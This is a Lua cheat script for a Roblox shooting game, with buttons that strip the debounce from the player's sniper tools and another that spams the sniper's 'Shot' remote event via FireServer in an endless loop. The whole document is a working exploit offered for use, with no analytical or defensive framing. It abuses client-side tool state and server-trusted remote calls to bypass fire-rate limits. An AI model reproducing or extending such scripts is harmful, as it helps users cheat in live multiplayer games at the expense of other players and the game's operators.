-- Script 👌

cclose.MouseButton1Click:Connect(function()

    cclose.BackgroundColor3 = Color3.new(1,1,1)

    FText.Text = "Loading"

   wait(0.1)

   FText.Text = "Loading."

   wait(0.1)

   FText.Text = "Loading.."

   wait(0.1)

   FText.Text = "Loading..."

    wait(0.1)

    AnewGui:Destroy()

    

    end)

Sniper1.MouseButton1Click:Connect(function()

    while true do

        wait(0.1)

        

        local User = game:GetService("Players").LocalPlayer.Character

        local Tool = User:FindFirstChild("Sniper")

        

        if User:FindFirstChild("Sniper") then

            if User:WaitForChild("Sniper") and Tool:FindFirstChild("DB") then -- Try to find the stupid sniper that you have.

            Sniper1.BackgroundColor3 = Color3.new(0,2,0)

            Tool.DB:Destroy()

            wait(2.2)

            Sniper1.BackgroundColor3 = Color3.new(2,0,0)

            end

        end

        end

    end)

Sniper2.MouseButton1Click:Connect(function()

    while true do

        wait(0.1)

        local User = game:GetService("Players").LocalPlayer.Character

        local Tool = User:FindFirstChild("Sniper 2")

    

    if User:FindFirstChild("Sniper 2") then

       if User:WaitForChild("Sniper 2") and Tool:FindFirstChild("DB") then -- i am not repeating this 🗿

           Sniper2.BackgroundColor3 = Color3.new(0,1,1)

           Tool.DB:Destroy()

           wait(1.4)

           Sniper2.BackgroundColor3 = Color3.new(1,0,0)

           end

       end

    end

   end)

Aspam.MouseButton1Click:Connect(function()

    local User = game:GetService("Players").LocalPlayer.Character

    local Tool = User:FindFirstChild("Sniper") or User:FindFirstChild("Sniper 2")

    

    if User:FindFirstChild("Sniper") or User:FindFirstChild("Sniper 2") then

        Tool.Handle.Fire:Play()

 

    end

    end)

LoopAspamp.MouseButton1Click:Connect(function()

local Lplayer = game.Players.LocalPlayer.PlayerGui

local Newgui = Instance.new("ScreenGui")

local NewButton = Instance.new("TextButton")

Newgui.Parent = Lplayer

Newgui.Name = "TestingGui"

Newgui.ResetOnSpawn = false

NewButton.Text = "SpamSnipe1"

NewButton.TextSize = 30

NewButton.Draggable = true

NewButton.Parent = Newgui

NewButton.BackgroundColor3 = Color3.new(0,0,1)

NewButton.BorderSizePixel = 5

NewButton.Position = UDim2.new(0.04, 0, 0.63, 0)

NewButton.Size = UDim2.new(0, 275, 0, 35)

NewButton.Font = Enum.Font.PatrickHand

NewButton.MouseButton1Click:Connect(function()

    while true do

wait(0.1)

NewButton.BackgroundColor3 = Color3.new(1,1,1)

local args = {

    [1] = CFrame.new(-2.4725799560546875, 16.38849639892578, 250), CFrame.new(0.312735378742218, -0.03842530772089958, 0.9490627646446228)

}

game:GetService("Players").LocalPlayer.Character.Sniper.Shot:FireServer(unpack(args))

wait(0.1)

NewButton.BackgroundColor3 = Color3.new(0,0,1)

    end

    end)

-- HMMMMM

    end)

